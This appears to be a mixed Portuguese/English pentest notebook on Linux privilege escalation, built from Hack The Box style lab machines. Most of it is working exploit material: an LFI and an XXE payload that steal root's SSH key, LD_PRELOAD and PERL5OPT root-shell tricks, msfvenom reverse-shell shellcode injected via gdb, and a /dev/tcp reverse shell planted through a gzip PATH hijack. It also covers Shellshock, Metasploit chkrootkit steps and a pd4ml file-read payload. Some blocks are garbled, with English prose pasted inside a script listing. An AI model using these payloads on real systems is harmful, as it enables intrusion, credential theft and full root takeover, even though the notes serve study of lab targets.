    Analisando a saída, podemos ver que Patrick implementou um novo comando chamado "file". Felizmente, temos o código-fonte para a função "fileCommand()" que parece ser chamada quando o comando "file" é usado no aplicativo de chat.
    Ao revisar a função "fileCommand()", podemos ver que ela recebe dois argumentos: um caminho de arquivo e uma senha. A senha correta está codificada logo abaixo como "CeilingCatStillAThingIn2021?".
    Em seguida, o caminho para o arquivo que será impresso é concatenado com o diretório de trabalho atual antes de tentar acessar o arquivo. A intenção do desenvolvedor provavelmente era restringir o acesso a arquivos fora do diretório de trabalho atual. No entanto, nenhuma sanitização é realizada na variável controlada pelo usuário "path", o que significa que podemos realizar um ataque de LFI para tentar ler a chave SSH do root usando o seguinte caminho: "../.../../../../../root/.ssh/id_rsa".
    
    ![Untitled](Privilege%20Escalation%20666fbc8472a6426690df085e8d884429/Untitled%2060.png)
    
    A chave SSH do root foi recuperada com sucesso. Agora, cole-a em nossa máquina local e remova o conteúdo indesejado (o prompt [SYSTEM]). Em seguida, alteramos as permissões da chave para 600. Por fim, podemos fazer login como root e ler /root/root.txt.
    
    ![Untitled](Privilege%20Escalation%20666fbc8472a6426690df085e8d884429/Untitled%2061.png)
    
- screen
    
    `ps -ef | grep screen`
    
    `screen -ls root/`
    
    ![Untitled](Privilege%20Escalation%20666fbc8472a6426690df085e8d884429/Untitled%2062.png)
    
    `screen -r root/`
    
- Nano Escape
    
    [Linux Privilege Escalation exploiting Sudo Rights — Part I | by Mohd Shibli | devconnected — DevOps, Sysadmins & Engineering | Medium](https://medium.com/schkn/linux-privilege-escalation-using-text-editors-and-files-part-1-a8373396708d)
    

# Insecure Scripts

- Exploit file monitor.sh
    
    `Sudo -l`
    
    ```
    jack@clicker:~$ sudo -l
    Matching Defaults entries for jack on clicker:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/s
    nap/bin, use_pty
    User jack may run the following commands on clicker:
    (ALL : ALL) ALL
    (root) SETENV: NOPASSWD: /opt/monitor.sh
    ```
    
    `SETENV`  este parâmetro indica que podemos passar parâmetros de ambiente ao correr o script.
    
     
    
    Parece que o utilizador jack pode executar o script /opt/monitor.sh como root sem necessidade de qualquer palavra-passe. Vamos inspecionar o conteúdo do ficheiro.
    
    ```
    jack@clicker:~$ cat /opt/monitor.sh
    #!/bin/bash
    if [ "$EUID" -ne 0 ]
    then echo "Error, please run as root"
    exit
    fi
    set
    PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr
    /local/games:/snap/bin
    unset PERL5LIB;
    unset PERLLIB;
    data=$(/usr/bin/curl -s http://clicker.htb/diagnostic.php?
    token=secret_diagnostic_token);
    The /opt/monitor.sh script first of all checks if the calling user is root . Then, it sets the PATH
    variable and unsets PERL5LIB and PERLLIB , as a form of protection. Afterwards, the script
    performs a GET request to the /diagnostic.php page of the Clicker web application. This page
    returns an XML file containing some diagnostic information, like memory usage. The information
    is formatted using xml_pp and shown to the user. Then, if the NOSAVE environment variable is set
    to "true", the script stops. Otherwise, the output of the curl command is saved in 
    /root/diagnostic_files , for future inspection.
    Let's see an example of execution:
    Since jack can change the environment of root before the execution of the script, we can set
    the variable HTTP_PROXY to redirect the request to our machine. Then, we can change the
    response of the server using BurpSuite and perform an XXE attack using the following payload,
    which reads and displays the root user's private SSH key:
    /usr/bin/xml_pp <<< $data;
    if [[ $NOSAVE == "true" ]]; then
    exit;
    else
    timestamp=$(/usr/bin/date +%s)
    /usr/bin/echo $data > /root/diagnostic_files/diagnostic_${timestamp}.xml
    fi
    ```
    
    O script /opt/monitor.sh começa por verificar se o utilizador que o chamou é root. Em seguida, define a variável PATH e desativa PERL5LIB e PERLLIB como forma de proteção. Depois, o script realiza um pedido GET à página /diagnostic.php da aplicação web Clicker. Esta página retorna um ficheiro XML contendo algumas informações de diagnóstico, como uso de memória. As informações são formatadas usando xml_pp e mostradas ao utilizador. Em seguida, se a variável de ambiente NOSAVE estiver definida como "true", o script pára. Caso contrário, a saída do comando curl é guardada em /root/diagnostic_files, para inspeção futura.
    Vejamos um exemplo de execução:
    
    - Primeiro exploit
        
        Este programa coloca o `LD_PRELOAD` com a variavel de sistema `/bin/bash` 
        
        ```
        #include<stdlib.h>
        
        void _init()
        {
        	unsetenv("LD_PRELOAD");
        	system("/bin/bash");
        }
        ```
        
        `gcc -shared exploit.c -o exploit -nostartfiles`
        
        Copiar o exploit para a maquina
        
        `sudo LD_PRELOAD=/dev/shm/exploit /opt/monitor.sh`
        
    - Segundo Exploit
        
        Interceptar o diagnostico 
        
        ```
        jack@clicker:~$ sudo /opt/monitor.sh
        <?xml version="1.0"?>
        <data>
        <timestamp>1705924260</timestamp>
        <date>2024/01/22 11:51:00am</date>
        <php-version>8.1.2-1ubuntu2.14</php-version>
        <test-connection-db>OK</test-connection-db>
        <memory-usage>395608</memory-usage>
        <environment>
        <APACHE_RUN_DIR>/var/run/apache2</APACHE_RUN_DIR>
        <SYSTEMD_EXEC_PID>1173</SYSTEMD_EXEC_PID>
        <APACHE_PID_FILE>/var/run/apache2/apache2.pid</APACHE_PID_FILE>
        <JOURNAL_STREAM>8:26775</JOURNAL_STREAM>
        <PATH>/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin</PATH>
        <INVOCATION_ID>76334d7b933945f2bae6f4e03c0de339</INVOCATION_ID>
        <APACHE_LOCK_DIR>/var/lock/apache2</APACHE_LOCK_DIR>
        <LANG>C</LANG>
        <APACHE_RUN_USER>www-data</APACHE_RUN_USER>
        <APACHE_RUN_GROUP>www-data</APACHE_RUN_GROUP>
        <APACHE_LOG_DIR>/var/log/apache2</APACHE_LOG_DIR>
        <PWD>/</PWD>
        </environment>
        </data>
        ```
        
        Uma vez que o utilizador jack pode alterar o ambiente do root antes da execução do script, podemos definir a variável HTTP_PROXY para redirecionar o pedido para a nossa máquina. Em seguida, podemos alterar a resposta do servidor usando o BurpSuite e realizar um ataque XXE usando a seguinte carga útil, que lê e exibe a chave SSH privada do utilizador root:
        
        ```
        <?xml version="1.0" encoding="ISO-8859-1"?>
        <!DOCTYPE foo [
        <!ELEMENT foo ANY >
        <!ENTITY xxe SYSTEM "/root/.ssh/id_rsa" >]>
        <foo>&xxe;</foo>
        ```
        
        Nota: Antes de executar o script, certifique-se de que o BurpSuite está configurado para interceptar pedidos em todas as interfaces e não apenas no localhost. Para fazer isso, vá para a aba Proxy, depois selecione Configurações de Proxy, em seguida, Edite o ouvinte de proxy ativo atual e selecione Todas as interfaces na opção Endereço de ligação.
        
        `sudo http_proxy=http://10.10.15.25:8080 /opt/monitor.sh`
        
        ![Untitled](Privilege%20Escalation%20666fbc8472a6426690df085e8d884429/Untitled%2063.png)
        
        Recebemos um retorno de chamada no nosso proxy. Devemos garantir que também interceptamos a resposta a este pedido, porque é aí que podemos injetar nosso payload XXE.
        
        ![Untitled](Privilege%20Escalation%20666fbc8472a6426690df085e8d884429/Untitled%2064.png)
        
        Depois de encaminharmos o pedido modificado, nossa carga útil é executada e a chave root é exibida no nosso terminal. Podemos salvar a chave SSH root para um arquivo, usar chmod 600 root para definir as permissões corretas e fazer login como root usando SSH.
        
    - Terceiro Exploit
        
        Embora o script bash desative corretamente as variáveis de ambiente PERLLIB e PERL5LIB, esta precaução é insuficiente. Como o script [monitor.sh](http://monitor.sh/) chama o xml_pp, que é um script Perl, as variáveis de ambiente PERL5OPT e PERL5DB ainda podem ser abusadas para executar comandos arbitrários, neste contexto, como root. Isso permite o caminho de exploração não intencional através de um comando como:
        
        jack@clicker:~$ `sudo PERL5OPT=-d PERL5DB='exec "chmod u+s /bin/bash"' /opt/monitor.sh`
        jack@clicker:~$ `bash -p`
        root@clicker:~# `id`
        uid=0(root) gid=0(root) groups=0(root)
        
    
- Insecure python scrip
    
    ```
    #!/usr/bin/env python3
    import socket
    import random
    import subprocess
    import pdb
    
    port = random.randint(1025, 65535)
    
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.bind(('127.0.0.1', port))
        sock.listen(1)
        print(f'Listening on localhost:{port}')
        (clientsock, addr) = sock.accept()
        clientsock.send(b'Enter the secret passsword: ')
        if clientsock.recv(1024).strip().decode() != 'secretadminpassword':
            clientsock.send(b'Wrong password!\n')
        else:
            clientsock.send(b'Welcome admin!\n')
            while True:
                clientsock.send(b'\nWhat do you wanna do: \n')
                clientsock.send(b'[1] View processes\n')
                clientsock.send(b'[2] View free memory\n')
                clientsock.send(b'[3] View listening sockets\n')
                clientsock.send(b'[4] Quit\n')
                option = int(clientsock.recv(1024).strip())
                if option == 1:
                    clientsock.send(subprocess.getoutput('ps aux').encode())
                elif option == 2:
                    clientsock.send(subprocess.getoutput('df').encode())
                elif option == 3:
                    clientsock.send(subprocess.getoutput('ss -lnt').encode())
                elif option == 4:
                    clientsock.send(b'Bye\n')
                    break
    except Exception as e:
        print(e)
        pdb.post_mortem(e.__traceback__)
    finally:
        quit()
    ```
    
    O Código tem um exception que é um python debugger, então temos de despultar um erro no scrip para ele ir para a exceção, e depois chegar a root.
    
    Este Código requer que se conecte a ele através, neste caso usamos o netcat 
    
    ```
    user@forge:/opt$ nc localhost 1930
    Enter the secret passsword: secretadminpassword
    Welcome admin!
    
    What do you wanna do: 
    [1] View processes
    [2] View free memory
    [3] View listening sockets
    [4] Quit
    pleas
    ```
    
    No debugger do python só temos de importar o modulo os e depois requisitamos um terminal, de notar que temos de correr o script com sudo para obter privilégios superiores.  
    
    ```
    user@forge:~$ sudo /usr/bin/python3 /opt/remote-manage.py
    Listening on localhost:1930
    invalid literal for int() with base 10: b'pleas'
    > /opt/remote-manage.py(27)<module>()
    -> option = int(clientsock.recv(1024).strip())
    (Pdb) import os
    (Pdb) os.system("/bin/bash")
    root@forge:/home/user# ls
    snap  user.txt
    root@forge:/home/user# cd /root
    ```
    
- gdb /usr/bin/gdb = cap_sys_ptrace+ep
    
    Esta vulnerabilidade tem a ver com a permissão de execução de enquanto se faz debug no codigo. Primeiro cria se o payload. 
    
    ```
    └──╼ [★]$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.67 LPORT=1234 -f py -o revshell.py
    [-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
    [-] No arch selected, selecting arch: x64 from the payload
    No encoder specified, outputting raw payload
    Payload size: 74 bytes
    Final size of py file: 384 bytes
    Saved as: revshell.py
    ```
    
    Depois entra no ficheiro criado, nest caso revshell.py, e acrescentar o payload e os vários ciclos 
    
    ```
    buf =  b""
    buf += b"\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05"
    buf += b"\x48\x97\x48\xb9\x02\x00\x04\xd2\x0a\x0a\x0e\x43"
    buf += b"\x51\x48\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05"
    buf += b"\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58\x0f\x05\x75"
    buf += b"\xf6\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f"
    buf += b"\x73\x68\x00\x53\x48\x89\xe7\x52\x57\x48\x89\xe6"
    buf += b"\x0f\x05"
    
    payload =  b"\x90" * (8 -len(buf) % 8) + buf 
    
    for i in range(0, len(buf), 8):
        chunk = payload[i:i+8][::-1]
        chunks = "0x"
        for byte in chunk:
            chunks += f"{byte:02x}"
        print(f"set {{long}}($rip+{i}) = {chunks}")
    ```
    
    Imprimir no terminal 
    
    ```
    └──╼ [★]$ python3 revshell.py 
    set {long}($rip+0) = 0x296a909090909090
    set {long}($rip+8) = 0x5e016a5f026a9958
    set {long}($rip+16) = 0x0002b9489748050f
    set {long}($rip+24) = 0x4851430e0a0ad204
    set {long}($rip+32) = 0x582a6a5a106ae689
    set {long}($rip+40) = 0xceff485e036a050f
    set {long}($rip+48) = 0x6af675050f58216a
    set {long}($rip+56) = 0x69622fbb4899583b
    set {long}($rip+64) = 0x8948530068732f6e
    set {long}($rip+72) = 0x050fe689485752e7
    ```
    
    Como o processo vai crashar, temos de utilizar um que não impeça a continuação. Poir isso foi o processo sleep que se escolheu.
    
    `gdb -p $(pgrep slepp)`
    
    Copiar o print para o gdb. Ao colocar o c e depois colocar o enter faz com que o programa execute o codigo. Por isso, antes de colocar em continuar, colocar um listener.
    
    ```
    developer@faculty:/tmp$ gdb -p $(pgrep slepp)
    
    Reading symbols from /usr/lib/debug/.build-id/45/87364908de169dec62ffa538170118c1c3a078.debug...
    0x00007f6ca9ff21b4 in _start () from /lib64/ld-linux-x86-64.so.2
    (gdb) set {long}($rip+0) = 0x296a909090909090
    (gdb) set {long}($rip+8) = 0x5e016a5f026a9958
    (gdb) set {long}($rip+16) = 0x0002b9489748050f
    (gdb) set {long}($rip+24) = 0x4851430e0a0ad204
    (gdb) set {long}($rip+32) = 0x582a6a5a106ae689
    (gdb) set {long}($rip+40) = 0xceff485e036a050f
    (gdb) set {long}($rip+48) = 0x6af675050f58216a
    (gdb) set {long}($rip+56) = 0x69622fbb4899583b
    (gdb) set {long}($rip+64) = 0x8948530068732f6e
    (gdb) set {long}($rip+72) = 0x050fe689485752e7
    (gdb) x/x $rip
    0x7f6ca9ff21b4 <_start>:	0x90909090
    (gdb) c
    ```
    
- ShellShock
    
    ```bash
    nmap --script http-shellshock --script-args “http-shellshock.uri=/gettime.cgi”
    192.242.220.3
    
    https://github.com/opsxcq/exploit-CVE-2014-6271
    
    () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'
    
    ```
    
    ![Untitled](Privilege%20Escalation%20666fbc8472a6426690df085e8d884429/Untitled%2065.png)
    

# Sudo

- Sudo Overtake
    
    ![Untitled](Privilege%20Escalation%20666fbc8472a6426690df085e8d884429/Untitled%2066.png)
    
    ```bash
    vi gzip 
    
    GZIP file content
    #!/bin/bash
    bash -i >& /dev/tcp/10.10.14.73/9000 0>&1
    
    chmod +x gzip
    which gzip 
    ```
    
    ![Untitled](Privilege%20Escalation%20666fbc8472a6426690df085e8d884429/Untitled%2067.png)
    
    ```bash
    export PATH=.:$PATH
    
    ```
    
- LD_PRELOAD
    
    sudo -l 
    
    **Leverage LD_PRELOAD**
    
    On some systems, you may see the LD_PRELOAD environment option.
    
    ![https://i.imgur.com/gGstS69.png](https://i.imgur.com/gGstS69.png)
    
    LD_PRELOAD is a function that allows any program to use shared libraries. This [blog post](https://rafalcieslak.wordpress.com/2013/04/02/dynamic-linker-tricks-using-ld_preload-to-cheat-inject-features-and-investigate-programs/) will give you an idea about the capabilities of LD_PRELOAD. If the "env_keep" option is enabled we can generate a shared library which will be loaded and executed before the program is run. Please note the LD_PRELOAD option will be ignored if the real user ID is different from the effective user ID.
    
    The steps of this privilege escalation vector can be summarized as follows;
    
    1. Check for LD_PRELOAD (with the env_keep option)
    2. Write a simple C code compiled as a share object (.so extension) file
    3. Run the program with sudo rights and the LD_PRELOAD option pointing to our .so file
    
    The C code will simply spawn a root shell and can be written as follows;
    
    ```c
    #include <stdio.h>
    #include <sys/types.h>
    #include <stdlib.h>
    void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
    }
    ```
    
    We can save this code as shell.c and compile it using gcc into a shared object file using the following parameters;
    
    `gcc -fPIC -shared -o shell.so shell.c -nostartfiles`
    
    ![https://i.imgur.com/HxbszMW.png](https://i.imgur.com/HxbszMW.png)
    
    We can now use this shared object file when launching any program our user can run with sudo. In our case, Apache2, find, or almost any of the programs we can run with sudo can be used.
    
    We need to run the program by specifying the LD_PRELOAD option, as follows;
    
    `sudo LD_PRELOAD=/home/user/ldpreload/shell.so find`
    
    This will result in a shell spawn with root privileges.
    
    ![https://i.imgur.com/1YwARyZ.png](https://i.imgur.com/1YwARyZ.png)
    

# NFS

- NFS
    
    Another vector that is more relevant to CTFs and exams is a misconfigured network shell. This vector can sometimes be seen during penetration testing engagements when a network backup system is present.
    
    NFS (Network File Sharing) configuration is kept in the /etc/exports file. This file is created during the NFS server installation and can usually be read by users.
    
    ![https://i.imgur.com/irDQTze.png](https://i.imgur.com/irDQTze.png)
    
    The critical element for this privilege escalation vector is the “no_root_squash” option you can see above. By default, NFS will change the root user to nfsnobody and strip any file from operating with root privileges. If the “no_root_squash” option is present on a writable share, we can create an executable with SUID bit set and run it on the target system.
    
    We will start by enumerating mountable shares from our attacking machine.
    
    ![https://i.imgur.com/CmXPDcv.png](https://i.imgur.com/CmXPDcv.png)
    
    We will mount one of the “no_root_squash” shares to our attacking machine and start building our executable.
    
    ![https://i.imgur.com/DwAB1qs.png](https://i.imgur.com/DwAB1qs.png)
    
    As we can set SUID bits, a simple executable that will run /bin/bash on the target system will do the job.
    
    ![https://i.imgur.com/nWKpFkK.png](https://i.imgur.com/nWKpFkK.png)
    
    Once we compile the code we will set the SUID bit.
    
    ![https://i.imgur.com/rkZOOjZ.png](https://i.imgur.com/rkZOOjZ.png)
    
    You will see below that both files (nfs.c and nfs are present on the target system. We have worked on the mounted share so there was no need to transfer them).
    
    ![https://i.imgur.com/U7IjT38.png](https://i.imgur.com/U7IjT38.png)
    

# Perl

- Perl (/usr/bin/perl = cap_setuid+ep)
    
    file
    
    ```perl
    #!/usr/bin/perl
    use POSIX qw(setuid);
    POSIX::setuid(0);
    exec "/bin/bash";
    ```
    
    Execução
    
    ```bash
    chmod 777 root.pl
    ./root.pl
    ```
    

# RootKit

- Rootkit
    
    ```c
    nmap -sS -sV 192.14.195.3
    
    Commands:
    use auxiliary/scanner/ssh/ssh_login
    set RHOSTS 192.14.195.3
    set USERNAME jackie
    set PASSWORD password
    exploit
    
    session -i 1
    ps aux
    cat /bin/check-down
    command -v chkrootkit
    /bin/chkrootkit -V
    searchsploit chkrootkit 0.49
    
    use exploit/unix/local/chkrootkit
    set CHKROOTKIT /bin/chkrootkit
    set session 1
    set LHOST 192.14.195.2
    exploit
    cat /root/flag
    ```
    

# AWS

- Aws vulnerable pd4ml
    
    Tendo um ponto de apoio no servidor, podemos enumerar o sistema de arquivos. Observamos a pasta bucket-app no diretório /var/www. Vamos enumerá-la mais detalhadamente.
    
    ![Untitled](Privilege%20Escalation%20666fbc8472a6426690df085e8d884429/Untitled%2068.png)
    
    Ao verificar as permissões da pasta, notamos que ela tem uma Lista de Controle de Acesso (ACL) definida.
    
    ![Untitled](Privilege%20Escalation%20666fbc8472a6426690df085e8d884429/Untitled%2069.png)
    
    As ACLs podem ser enumeradas usando o utilitário getfacl.
    
    ![Untitled](Privilege%20Escalation%20666fbc8472a6426690df085e8d884429/Untitled%2070.png)
    
    Parece que apenas os usuários roy e root têm permissões para esta pasta.
    
    ![Untitled](Privilege%20Escalation%20666fbc8472a6426690df085e8d884429/Untitled%2071.png)
    
    Também é possível acessar a pasta do projeto.
    
    ![Untitled](Privilege%20Escalation%20666fbc8472a6426690df085e8d884429/Untitled%2072.png)
    
    Lá encontramos um arquivo PHP cujo conteúdo podemos visualizar.
    
    ![Untitled](Privilege%20Escalation%20666fbc8472a6426690df085e8d884429/Untitled%2073.png)
    
    DynamoDB
    
    Parece que o projeto ainda está em desenvolvimento. O código está tentando se conectar ao serviço DynamoDB usando uma URL de endpoint. DynamoDB é um serviço de banco de dados NoSQL que suporta estruturas de dados chave-valor e de documentos. Vamos configurar as credenciais para este usuário.
    
    `mkdir /tmp/f`
    `export HOME=/tmp/f`
    `aws configure`
    
    ![Untitled](Privilege%20Escalation%20666fbc8472a6426690df085e8d884429/Untitled%2074.png)
    
    Agora é possível listar todas as tabelas do DynamoDB.
    
    `aws --endpoint-url=http://localhost:4566 dynamodb list-tables`
    
    ![Untitled](Privilege%20Escalation%20666fbc8472a6426690df085e8d884429/Untitled%2075.png)
    
    Existe uma tabela de usuários. Vamos visualizar seu conteúdo.
    
    `aws --endpoint-url=http://localhost:4566 dynamodb scan --table-name users`
    
    ![Untitled](Privilege%20Escalation%20666fbc8472a6426690df085e8d884429/Untitled%2076.png)
    
    Vemos que existem dois serviços em execução no servidor de destino. Vamos também navegar até /shell.
    
    ![Bildschirmfoto 2024-03-07 um 22.26.16.png](Privilege%20Escalation%20666fbc8472a6426690df085e8d884429/Bildschirmfoto_2024-03-07_um_22.26.16.png)
    
    Observamos que ele redireciona para outro nome de host e para uma porta diferente. A porta não está aberta externamente e também redireciona para shell/. Visitamos o diretório /shell/.
    
    ![Bildschirmfoto 2024-03-07 um 22.27.19.png](Privilege%20Escalation%20666fbc8472a6426690df085e8d884429/Bildschirmfoto_2024-03-07_um_22.27.19.png)
    
    Isto hospeda um DynamoDB JavaScript Shell. DynamoDB é um serviço de banco de dados NoSQL que suporta estruturas de dados chave-valor e de documentos. Podemos consultar a documentação da AWS para aprender como enumerar informações do DynamoDB usando JavaScript. É possível listar as tabelas usando o código JavaScript abaixo.
    
    ```powershell
    var params = {
     };
     dynamodb.listTables(params, function(err, data) {
       if (err) console.log(err, err.stack); // an error occurred
       else     console.log(data);           // successful response
    });
    ```
    
    ![Bildschirmfoto 2024-03-07 um 22.28.34.png](Privilege%20Escalation%20666fbc8472a6426690df085e8d884429/Bildschirmfoto_2024-03-07_um_22.28.34.png)
    
    Observamos que a tabela de usuários está presente e podemos visualizar o conteúdo dentro desta tabela.
    
    ```powershell
    var params = {
      TableName: "users"
     };
    dynamodb.scan(params, function(err, data) {
       if (err) console.log(err, err.stack); // an error occurred
       else     console.log(data); // successful response
    });
    ```
    
    ![Bildschirmfoto 2024-03-07 um 22.29.30.png](Privilege%20Escalation%20666fbc8472a6426690df085e8d884429/Bildschirmfoto_2024-03-07_um_22.29.30.png)
    
    Agora é possível acessar a pasta bucket-app.
    
    ![Bildschirmfoto 2024-03-07 um 22.31.15.png](Privilege%20Escalation%20666fbc8472a6426690df085e8d884429/Bildschirmfoto_2024-03-07_um_22.31.15.png)
    
    Ao explorar os arquivos de configuração do Apache, descobrimos que este aplicativo está sendo executado como usuário root. Portanto, vale a pena enumerar ainda mais o aplicativo.
    
    ![Bildschirmfoto 2024-03-07 um 22.31.50.png](Privilege%20Escalation%20666fbc8472a6426690df085e8d884429/Bildschirmfoto_2024-03-07_um_22.31.50.png)
    
    Este aplicativo está escutando localmente na porta 8000. Podemos realizar um encaminhamento de porta usando SSH para acessar o aplicativo.
    
    ssh -L 8000:127.0.0.1:8000 roy@bucket.htb
    
    Agora o aplicativo pode ser acessado navegando para a porta localhost:8000 em nossa máquina.
    
    ![Bildschirmfoto 2024-03-07 um 22.33.09.png](Privilege%20Escalation%20666fbc8472a6426690df085e8d884429/Bildschirmfoto_2024-03-07_um_22.33.09.png)
    
    **PD4ML**
    
    ```php
    <?php
    require 'vendor/autoload.php';
    use Aws\DynamoDb\DynamoDbClient;
    if($_SERVER["REQUEST_METHOD"]==="POST") {
            if($_POST["action"]==="get_alerts") {
                    date_default_timezone_set('America/New_York');
                    $client = new DynamoDbClient([
                            'profile' => 'default',
                            'region'  => 'us-east-1',
                          'version' => 'latest',
                            'endpoint' => 'http://localhost:4566'
    ]);
                    $iterator = $client->getIterator('Scan', array(
                        'TableName' => 'alerts',
     'FilterExpression' => "title = :title",
                        'ExpressionAttributeValues' =>
    array(":title"=>array("S"=>"Ransomware")),
                    ));
                    foreach ($iterator as $item) {
                        $name=rand(1,10000).'.html';
                        file_put_contents('files/'.$name,$item["data"]);
                    }
                passthru("java -Xmx512m -Djava.awt.headless=true -cp pd4ml_demo.jar
    Pd4Cmd file:///var/www/bucket-app/files/$name 800 A4 -out files/result.pdf");
            }
    }
    else
    {
    ?>
    ```
    
    O código acima se conecta ao serviço DynamoDB e realiza uma varredura na tabela de alertas. Em seguida, filtra o conteúdo com base no título. Se houver uma chave que contenha o título Ransomware, ele escreve seu valor de dados para um arquivo HTML aleatório dentro da pasta files. Usando o utilitário PD4ML, ele converte o conteúdo HTML em um arquivo PDF. Ao verificar a lista de tabelas, observamos que não há tabela de alertas presente no banco de dados do DynamoDB.
    
    Vamos configurar as credenciais da AWS e criar a tabela emitindo o seguinte comando.
    
    `aws --endpoint-url=http://localhost:4566 dynamodb create-table --table-name
    alerts  --attribute-definitions AttributeName=title,AttributeType=S
    AttributeName=data,AttributeType=S --key-schema
    AttributeName=title,KeyType=HASH AttributeName=data,KeyType=RANGE --
    provisioned-throughput ReadCapacityUnits=5,WriteCapacityUnits=5`
    
    Isso cria uma tabela chamada alerts com dois atributos: title e data. Como o aplicativo filtra o conteúdo com base no título Ransomware, é possível inserir um registro com um código HTML de exemplo.
    
    `aws --endpoint-url=http://localhost:4566 dynamodb put-item --table-name alerts
    --item '{"title":{"S":"Ransomware"},"data":{"S":"<html><h1>test</h1></html>"}}'`
    
    ![Bildschirmfoto 2024-03-07 um 22.35.20.png](Privilege%20Escalation%20666fbc8472a6426690df085e8d884429/Bildschirmfoto_2024-03-07_um_22.35.20.png)
    
    Enviamos uma solicitação POST com a ação de get_alerts para acionar a conversão HTML.
    
    `curl http://localhost:8000/index.php -d 'action=get_alerts'`
    
    Isso gera dois arquivos no diretório files.
    
    ![Bildschirmfoto 2024-03-07 um 22.36.44.png](Privilege%20Escalation%20666fbc8472a6426690df085e8d884429/Bildschirmfoto_2024-03-07_um_22.36.44.png)
    
    Agora vamos navegar até http://localhost:8000/files/result.pdf para baixar o arquivo PDF.
    
      `wget http://localhost:8000/files/result.pdf`
    
    ![Bildschirmfoto 2024-03-07 um 22.37.36.png](Privilege%20Escalation%20666fbc8472a6426690df085e8d884429/Bildschirmfoto_2024-03-07_um_22.37.36.png)
    
    Vemos que o PDF é de fato criado com o HTML que fornecemos no banco de dados. Verificando as tags HTML suportadas para pd4ml, descobrimos que também podemos incorporar um recurso externo como anexo de PDF usando a tag de anexo.
    
    ```php
    <pd4ml:attachment src="http://pd4ml.com/i/logo.png" description="test"
    icon="Paperclip"/>
    ```
    
    Vamos verificar isso anexando o arquivo /etc/passwd ao PDF.
    
    ```php
    <html><pd4ml:attachment src="file:///etc/passwd" description="test"
    icon="Paperclip"/></html>
    ```
    
    `aws --endpoint-url=http://localhost:4566 dynamodb put-item --table-name alerts
    --item '{"title":{"S":"Ransomware"},"data":{"S":"<html><pd4ml:attachment
    src='\''file:///etc/passwd'\'' description='\''test'\''
    icon='\''Paperclip'\''/></html>"}}'`
    
    ![Bildschirmfoto 2024-03-07 um 22.38.56.png](Privilege%20Escalation%20666fbc8472a6426690df085e8d884429/Bildschirmfoto_2024-03-07_um_22.38.56.png)
    
    O ataque foi bem-sucedido e podemos visualizar o conteúdo de /etc/passwd. Também é possível listar o conteúdo de diretórios com essa vulnerabilidade. Vamos tentar visualizar os arquivos dentro do diretório /root.
    
    `aws --endpoint-url=http://localhost:4566 dynamodb put-item --table-name alerts
    --item '{"title":{"S":"Ransomware"},"data":{"S":"<html><pd4ml:attachment
    src='\''file:///root/.ssh/id_rsa'\'' description='\''test'\''
    icon='\''Paperclip'\''/></html>"}}'`
    
    A pasta .ssh está presente. Vale a pena tentar capturar o arquivo id_rsa desta pasta.
    
    ![Bildschirmfoto 2024-03-07 um 22.40.20.png](Privilege%20Escalation%20666fbc8472a6426690df085e8d884429/Bildschirmfoto_2024-03-07_um_22.40.20.png)
    

# ZIP

- CryptoZip
    
    ```python
    unzip -l uploaded-file-3422.zip
    Archive: uploaded-file-3422.zip
    Length Date Time Name
    --------- ---------- ----- ----
    220 2020-02-25 14:03 .bash_logout
    3771 2020-02-25 14:03 .bashrc
    807 2020-02-25 14:03 .profile
    0 2021-07-02 21:58 .cache/
    0 2021-07-02 21:58 .cache/motd.legal-displayed
    0 2021-07-02 21:58 .sudo_as_admin_successful
    0 2022-03-07 14:32 .ssh/
    2610 2022-03-07 14:32 .ssh/id_rsa
    564 2022-03-07 14:32 .ssh/authorized_keys
    564 2022-03-07 14:32 .ssh/id_rsa.pub
    2009 2022-03-07 14:32 .viminfo
    32 2022-03-07 14:33 user.txt
    --------- -------
    10577 12 files
    ```
    
    Parece ser um backup de um diretório pessoal. Curiosamente, ele inclui as chaves SSH. Infelizmente, o arquivo requer uma palavra-passe para extrair o seu conteúdo. Podemos usar o 7zip para obter mais informações sobre o arquivo.
    
    ```python
    7z l -slt uploaded-file-3422.zip
    Listing archive: uploaded-file-3422.zip
    --
    Path = uploaded-file-3422.zip
    Type = zip
    Physical Size = 7939
    ----------
    Path = .bash_logout
    Folder = -
    Size = 220
    Packed Size = 170
    Modified = 2020-02-25 14:03:22
    Created =
    Accessed =
    Attributes = -rw-r--r--
    Encrypted = +
    Comment =
    CRC = 6CE3189B
    Method = ZipCrypto Deflate
    Characteristics = UT:MA:1 ux : Encrypt Descriptor
    Host OS = Unix
    Version = 20
    Volume Index = 0
    ```
    
    O método utilizado para a encriptação é o ZipCrypto . Felizmente para nós, existe um ataque de texto simples conhecido contra arquivos Zip encriptados com o método ZipCrypto antigo. O ataque requer que saibamos o conteúdo não encriptado de um ficheiro que está incluído no arquivo. Poderíamos ir para o ficheiro user.txt que obtivemos, mas as bandeiras estão a ser rodadas em cada instância, por isso pode não ser um bom candidato. Por outro lado, .bash_logout é um ficheiro que não é comummente alterado, por isso podemos usá-lo como uma referência de texto claro. Podemos calcular o valor da verificação de redundância cíclica (CRC) do nosso arquivo e verificar se ele corresponde ao da máquina remota, que o comando 7zip acima mostrou ser 6CE3189B.
    
    Executamos o seguinte comando Python:
    
    ```python
    python3 -c "import binascii; data = open('/root/.bash_logout', 'rb').read();
    print(hex(binascii.crc32(data) & 0xFFFFFFFF))"
    0x6ce3189b
    ```
    
    O CRC coincide com o do arquivo. Podemos, portanto, usar a ferramenta bkcrack para realizar este ataque. Antes de mais, criamos um arquivo Zip com o nosso ficheiro .bash_logout.
    
    `cp ~/.bash_logout`
